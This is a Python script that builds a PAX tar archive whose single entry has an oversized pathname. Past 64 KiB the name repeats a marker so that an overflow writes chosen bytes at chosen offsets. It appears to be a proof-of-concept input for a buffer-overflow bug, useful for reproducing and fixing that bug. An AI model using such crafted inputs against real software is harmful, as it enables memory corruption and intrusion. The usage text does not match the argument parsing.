#!/usr/bin/env python3
"""Craft a deterministic PAX tar whose single entry has an oversized pathname.

Usage: gen_tar.py OUTPUT TAR PATHLEN [PAYLOADLEN]
The first 64 KiB of the pathname is 'A' (fits the ZIP central-directory
segment). Bytes beyond 64 KiB repeat a 16-byte marker, so any write past the
segment carries chosen, recognisable bytes at chosen offsets. The entry body is
PAYLOADLEN bytes of 'B' (default 1). No network access; local file only.
"""
import io
import sys
import tarfile

MARKER = b"CHOSEN-DEADBEEF!"


def main() -> int:
    if len(sys.argv) not in (3, 4, 5):
        print(__doc__, file=sys.stderr)
        return 2
    output, pathlen = sys.argv[1], int(sys.argv[2])
    payloadlen = int(sys.argv[3]) if len(sys.argv) >= 4 else 1
    if pathlen < 1 or payloadlen < 0:
        return 2

    head = b"A" * min(pathlen, 65536)
    tail_len = pathlen - len(head)
    tail = (MARKER * ((tail_len // len(MARKER)) + 1))[:tail_len]
    path = (head + tail).decode("ascii")

    with tarfile.open(output, "w", format=tarfile.PAX_FORMAT) as tf:
        info = tarfile.TarInfo(path)
        info.size = payloadlen
        info.mtime = 0
        info.mode = 0o644
        info.uid = info.gid = 0
        info.uname = info.gname = ""
        tf.addfile(info, io.BytesIO(b"B" * payloadlen))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
